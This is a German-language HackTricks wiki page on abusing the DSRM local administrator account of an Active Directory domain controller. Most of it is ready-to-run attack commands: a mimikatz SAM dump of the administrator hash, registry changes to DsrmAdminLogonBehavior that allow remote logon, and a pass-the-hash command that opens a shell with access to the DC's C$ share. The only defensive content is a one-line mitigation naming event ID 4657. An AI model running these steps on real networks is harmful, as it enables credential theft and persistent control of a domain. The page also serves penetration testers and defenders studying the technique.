{{#include ../../banners/hacktricks-training.md}}

# DSRM-Anmeldeinformationen

Es gibt ein **lokales Administratorkonto** in jedem **DC**. Mit Administratorrechten auf diesem Rechner können Sie mimikatz verwenden, um den **Hash des lokalen Administrators** zu **dumpen**. Dann modifizieren Sie eine Registrierung, um dieses Passwort zu **aktivieren**, damit Sie remote auf diesen lokalen Administratorkonto zugreifen können.\
Zuerst müssen wir den **Hash** des **lokalen Administrators** im DC **dumpen**:
```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
```
Dann müssen wir überprüfen, ob dieses Konto funktioniert, und wenn der Registrierungsschlüssel den Wert "0" hat oder nicht existiert, müssen Sie **ihn auf "2" setzen**:
```bash
Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
```
Dann können Sie mit einem PTH **den Inhalt von C$ auflisten oder sogar eine Shell erhalten**. Beachten Sie, dass für die Erstellung einer neuen PowerShell-Sitzung mit diesem Hash im Speicher (für den PTH) **die "Domain", die verwendet wird, nur der Name der DC-Maschine ist:**
```bash
sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
#And in new spawned powershell you now can access via NTLM the content of C$
ls \\dc-host-name\C$
```
Mehr Informationen dazu unter: [https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714) und [https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)

## Minderung

- Ereignis-ID 4657 - Überprüfung der Erstellung/Änderung von `HKLM:\System\CurrentControlSet\Control\Lsa DsrmAdminLogonBehavior`

{{#include ../../banners/hacktricks-training.md}}
